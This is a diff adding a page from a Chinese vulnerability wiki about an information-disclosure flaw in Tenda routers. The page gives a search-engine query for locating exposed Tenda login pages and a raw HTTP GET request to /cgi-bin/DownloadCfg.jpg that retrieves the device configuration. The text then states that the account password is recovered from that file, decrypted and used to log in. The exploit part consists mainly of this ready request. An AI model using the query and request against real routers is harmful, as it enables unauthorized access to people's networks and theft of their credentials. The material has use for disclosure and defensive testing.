@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Tenda/Tenda%E8%B7%AF%E7%94%B1%E5%99%A8DownloadCfg%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Tenda 路由器 DownloadCfg 信息泄露漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Tenda \u8def\u7531\u5668 DownloadCfg \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        Tenda路由器账号密码泄露
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Tenda-FH1201%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-41473%29/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Tenda-FH1201%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-41473%29/" class="btn btn-xs btn-link">
+        Tenda-FH1201存在命令注入漏洞(CVE-2024-41473)
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="tenda-downloadcfg">Tenda 路由器 DownloadCfg 信息泄露漏洞<a class="headerlink" href="#tenda-downloadcfg" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>Tenda 路由器是深圳市吉祥腾达科技有限公司的一款智能无限路由器。Tenda 路由器存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息网访问该系统。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>Tenda 路由器</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>hunter<code>web.title="Tenda | LOGIN"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1701753587120-3c35a8f8-5e6c-44fc-a622-f307f0b5e7fc.png" src="./img/HuzV0y4anBpmEYe1/1701753587120-3c35a8f8-5e6c-44fc-a622-f307f0b5e7fc-543813.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">DownloadCfg</span><span class="p">.</span><span class="na">jpg</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">xx</span><span class="p">.</span><span class="na">xx</span><span class="p">.</span><span class="na">xx</span><span class="p">.</span><span class="na">xx</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mf">10.15</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mf">120.0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mf">120.0</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.2</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+<span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="n">cn</span><span class="p">,</span><span class="n">en</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+<p><img alt="1701753858226-d38759e2-793c-45df-83c1-16c137293980.png" src="./img/HuzV0y4anBpmEYe1/1701753858226-d38759e2-793c-45df-83c1-16c137293980-207037.png" /></p>
+<p>从配置文件中可找到系统账号密码</p>
+<p><img alt="1701753905473-968c5560-03de-480e-81eb-4e6028247296.png" src="./img/HuzV0y4anBpmEYe1/1701753905473-968c5560-03de-480e-81eb-4e6028247296-014519.png" /></p>
+<p>解密后成功登录系统</p>
+<p><img alt="1701753934193-5e17d3df-29e6-4613-a5d9-2ac1258b5991.png" src="./img/HuzV0y4anBpmEYe1/1701753934193-5e17d3df-29e6-4613-a5d9-2ac1258b5991-492114.png" /></p>
+<p><img alt="1701753950653-631706d4-3fa3-4c1a-bf44-e84c5f7514c9.png" src="./img/HuzV0y4anBpmEYe1/1701753950653-631706d4-3fa3-4c1a-bf44-e84c5f7514c9-018661.png" /></p>
+<blockquote>
+<p>更新: 2024-02-29 23:57:12<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/gk3rgwxmuynm2p33">https://www.yuque.com/xiaokp7/ocvun2/gk3rgwxmuynm2p33</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        Tenda路由器账号密码泄露
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Tenda-FH1201%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-41473%29/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Tenda-FH1201%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-41473%29/" class="btn btn-xs btn-link">
+        Tenda-FH1201存在命令注入漏洞(CVE-2024-41473)
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
